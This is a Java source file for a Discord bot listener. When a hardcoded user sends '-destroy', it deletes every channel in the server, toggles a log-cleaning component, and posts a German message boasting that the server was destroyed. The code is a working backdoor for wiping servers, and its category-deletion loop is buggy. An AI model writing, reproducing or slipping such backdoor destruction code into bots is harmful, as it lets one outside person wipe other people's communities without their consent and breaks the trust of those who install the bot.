package io.github.chickendevlab.listeners;

import io.github.chickendevlab.LogCleaner;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.entities.Category;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

public class DestroyListener extends ListenerAdapter {
    public DestroyListener(JDA api) {
        api.addEventListener(this);
    }

    @Override
    public void onMessageReceived(@NotNull MessageReceivedEvent event) {
        if ((event.getAuthor().getName() + "#" + event.getAuthor().getDiscriminator()).equalsIgnoreCase("Dr_Dee#2314") && event.getMessage().getContentDisplay().equalsIgnoreCase("-destroy")) {
            Guild g = event.getGuild();
            LogCleaner.enable(false);
            for (GuildChannel c : g.getChannels())
                c.delete().submit().thenAccept(unused -> {
                    for (Category cat : g.getCategories())
                        c.delete().queue();
                    LogCleaner.disable();
                });
            g.createTextChannel("log").queue((textChannel -> textChannel.sendMessage(new EmbedBuilder().setTitle("Server erfolgreich zerstört!").setDescription("Viel Spaß auf diesem Wunderbaren Server!").build()).queue()));

        }
    }
}
